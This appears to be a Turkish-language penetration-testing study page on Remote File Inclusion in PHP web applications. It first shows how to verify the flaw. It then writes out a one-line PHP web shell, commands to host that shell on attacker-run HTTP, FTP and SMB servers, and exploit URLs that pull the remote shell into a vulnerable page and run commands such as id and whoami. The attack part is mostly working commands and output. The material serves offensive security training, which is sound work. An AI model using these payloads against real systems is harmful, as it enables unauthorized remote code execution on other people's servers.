---
glightbox: true
icon: material/circle-small
---

# Remote File Inclusion (RFI)

## Verify RFI

LFI zafiyetinin olduğu bir web uygulamasında RFI zafiyetinin de olup olmadığını kontrol etmek için, önceki bölümlerde bahsedilen `allow_url_include` seçeneği aynı şekilde kontrol edilebilir. Ancak RFI için bu kontrol yanıltıcı olabilir. Bunun yerine URL dahil etmeyi deneyebiliriz. Güvenlik sistemleri tarafından engellenmemek için, ilk aşamada yerel bir URL denemekte fayda vardır:

* [x] Örneğin URL şu şekilde gözükebilir:

```text
http://SERVER_IP_ADDRESS:PORT/index.php?language=http://127.0.0.1:80/index.php
```

!!! warning "Recursive Inclusion"

    Savunmasız sayfanın kendisini (örneğin `index.php`) dahil etmek uygun bir yöntem olmayabilir. Çünkü bu durum, özyinelemeli bir RFI döngüsüne sebep olarak arka uç sunucusunda bir DoS saldırısına neden olabilir.

## Remote Code Execution with RFI

Uzaktan kod yürütebilmek için, ilgili web uygulamasının dilinde bir script (örneğin PHP için `shell.php`) oluşturabiliriz:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### HTTP

```bash
sudo python3 -m http.server LISTENING_PORT
```

```text title="Output"
Serving HTTP on 0.0.0.0 port LISTENING_PORT (http://0.0.0.0:LISTENING_PORT/) ...
```

* [x] Şu şekilde bir URL denenebilir:

```text
http://SERVER_IP_ADDRESS:PORT/index.php?language=http://OUR_IP_ADDRESS:LISTENING_PORT/shell.php&cmd=id
```

### FTP

```bash
sudo python -m pyftpdlib -p 21
```

```text title="Output"
...SNIP... >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
...SNIP... concurrency model: async
...SNIP... masquerade (NAT) address: None
...SNIP... passive ports: None
```

* [x] Şu şekilde bir URL denenebilir:

```text
http://SERVER_IP_ADDRESS:PORT/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id
```

### SMB

Savunmasız web uygulaması Windows sunucusu üzerinden servis ediliyorsa `allow_url_include` seçeneğini kontrol etmemize gerek yoktur. Çünkü uzak SMB sunucusundaki dosyalar, normal dosyalar gibi işlem görür.

```bash
impacket-smbserver -smb2support share $(pwd)
```

```text title="Output"
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

* [x] Şu şekilde bir URL denenebilir:

```text
http://SERVER_IP_ADDRESS:PORT/index.php?language=\\OUR_IP_ADDRESS\share\shell.php&cmd=whoami
```
